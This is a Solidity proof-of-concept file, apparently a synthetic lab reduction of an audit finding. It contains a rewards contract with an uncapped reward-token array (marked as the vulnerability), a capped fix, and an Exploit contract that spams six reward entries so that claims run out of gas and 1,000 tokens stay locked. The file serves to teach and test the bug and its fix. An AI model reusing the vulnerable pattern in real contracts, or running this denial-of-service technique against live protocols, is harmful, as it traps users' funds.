// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Paladin Valkyrie — poolRewards grows without a cap (Cyfrin, finding 61554)
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: anyone can push a reward token into poolRewards. claim loops
    the whole array. A notifying hook forwards a bounded gas stipend. Six
    extra tokens, plus the real reward, make that call run out of gas.
    1,000 RWD stay in the contract. A cap of one reward token lets the same
    stipend pay the 1,000 RWD. */

address constant LP = 0x2222222222222222222222222222222222222222;

contract RewardToken {
    string public name = "RWD";
    string public symbol = "RWD";
    uint8 public decimals = 18;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract PoolRewards {
    // Gas a balance-change notification forwards into the reward loop.
    // Enough for the single real reward, not for six spam entries on top of it.
    uint256 public constant HOOK_GAS = 160_000;

    RewardToken public token;
    address[] public poolRewards;
    mapping(address => uint256) public rewardPerToken;
    mapping(address => mapping(address => uint256)) public userPaid;
    mapping(address => uint256) public touched;

    constructor(RewardToken t) {
        token = t;
    }

    function rewardCount() external view returns (uint256) {
        return poolRewards.length;
    }

    function addReward(address rewardToken) external {
        uint256 n = poolRewards.length;
        for (uint256 i; i < n; i++) {
            if (poolRewards[i] == rewardToken) return;
        }
        poolRewards.push(rewardToken);
    }

    function claim(address account) external returns (uint256 paid) {
        (bool ok, bytes memory ret) = address(this).call{gas: HOOK_GAS}(
            abi.encodeWithSelector(this.claimInner.selector, account)
        );
        require(ok, "unbounded rewards");
        paid = abi.decode(ret, (uint256));
    }

    function claimInner(address account) external returns (uint256 paid) {
        require(msg.sender == address(this), "self");
        _updateAllUserState(account);
        paid = token.balanceOf(address(this));
        if (paid > 0) token.transfer(account, paid);
    }

    function _updateAllUserState(address account) internal {
        address[] memory _tokens = poolRewards;
        uint256 _length = _tokens.length;
        // @> VULN: poolRewards has no cap, so this loop exhausts the notifier's gas
        for (uint256 i; i < _length; i++) {
            _updateRewardState(_tokens[i], account);
        }
    }

    function _updateRewardState(address rewardToken, address account) internal {
        uint256 next = rewardPerToken[rewardToken] + 1;
        rewardPerToken[rewardToken] = next;
        userPaid[rewardToken][account] = next;
        touched[rewardToken] = block.timestamp;
    }
}

contract PoolRewardsCapped {
    uint256 public constant HOOK_GAS = 160_000;
    uint256 public constant CAP = 1;

    RewardToken public token;
    address[] public poolRewards;
    mapping(address => uint256) public rewardPerToken;
    mapping(address => mapping(address => uint256)) public userPaid;
    mapping(address => uint256) public touched;

    error RewardCap(uint256 cap);

    constructor(RewardToken t) {
        token = t;
    }

    function addReward(address rewardToken) external {
        if (poolRewards.length >= CAP) revert RewardCap(CAP);
        poolRewards.push(rewardToken);
    }

    function claim(address account) external returns (uint256 paid) {
        (bool ok, bytes memory ret) = address(this).call{gas: HOOK_GAS}(
            abi.encodeWithSelector(this.claimInner.selector, account)
        );
        require(ok, "unbounded rewards");
        paid = abi.decode(ret, (uint256));
    }

    function claimInner(address account) external returns (uint256 paid) {
        require(msg.sender == address(this), "self");
        address[] memory _tokens = poolRewards;
        uint256 _length = _tokens.length;
        for (uint256 i; i < _length; i++) {
            uint256 next = rewardPerToken[_tokens[i]] + 1;
            rewardPerToken[_tokens[i]] = next;
            userPaid[_tokens[i]][account] = next;
            touched[_tokens[i]] = block.timestamp;
        }
        paid = token.balanceOf(address(this));
        if (paid > 0) token.transfer(account, paid);
    }
}

contract Exploit {
    uint256 public constant REWARDS = 1000 ether;
    uint256 public constant SPAM = 6;

    RewardToken public token;
    PoolRewards public pool;
    bool public claimReverted;
    uint256 public stuck;
    uint256 public entries;

    constructor() {
        token = new RewardToken();
        pool = new PoolRewards(token);
        token.mint(address(this), REWARDS);
    }

    function run() external {
        pool.addReward(address(token));
        token.transfer(address(pool), REWARDS);
        for (uint256 i = 1; i <= SPAM; i++) {
            pool.addReward(address(uint160(i)));
        }
        entries = pool.rewardCount();
        require(entries == SPAM + 1, "spam was not pushed");
        (bool ok,) = address(pool).call(abi.encodeWithSelector(pool.claim.selector, LP));
        claimReverted = ok == false;
        stuck = token.balanceOf(address(pool));
        require(claimReverted, "claim did not revert");
        require(stuck == REWARDS, "1000 RWD did not stay in the pool");
        require(token.balanceOf(LP) == 0, "LP was paid");
    }
}
